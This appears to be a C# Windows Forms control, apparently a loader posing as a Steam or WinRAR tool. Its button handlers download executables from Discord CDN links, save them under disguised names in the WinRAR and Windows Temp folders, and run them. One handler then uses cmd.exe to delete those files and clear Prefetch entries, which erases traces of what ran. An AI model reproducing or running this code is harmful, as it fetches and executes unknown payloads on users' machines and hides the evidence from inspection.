using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Steam
{
    public partial class UserControl1 : UserControl
    {
        public UserControl1()
        {
            InitializeComponent();
        }

        private void siticoneRoundedButton1_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process(); ;
            string fileName2 = "C:\\Program Files\\WinRAR\\RarExtInstaller.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1136033820894834698/1140756990054907914/nzmp.exe", fileName2);
        }

        private void siticoneRoundedButton2_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo();
            Process.Start("C:\\Program Files\\WinRAR\\RarExtInstaller.exe");
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }

        private void siticoneRoundedButton3_Click(object sender, EventArgs e)
        {
            WebClient webClient = new WebClient();
            Process process = new Process(); ;
            string fileName2 = "C:\\Windows\\Temp\\nse948.tmp.exe";
            webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182083/1136455922064031744/nse948.tmp.exe", fileName2);
            Process.Start("C:\\Windows\\Temp\\nse948.tmp.exe");

            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = false,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Program Files\\WinRAR\\RarExtInstaller.exe");
                standardInput.WriteLine("ping 1.1.1.1 - n 1 - w 3000 > Nul & Del / f / q  C:\\Windows\\Temp\\nse948.tmp.exe");
                standardInput.WriteLine("cd C:\\Windows\\Prefetch & Del CMD* ");
                string fileName21 = "C:\\Program Files\\WinRAR\\RarExtInstaller.exe";
                webClient.DownloadFile("https://cdn.discordapp.com/attachments/1128125897099182082/1143338725301030954/RarExtInstaller.exe", fileName21);
            }

            //await PutTaskDelay(500);
            //Thread.Sleep(3000);




            _ = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();
        }
    }
}
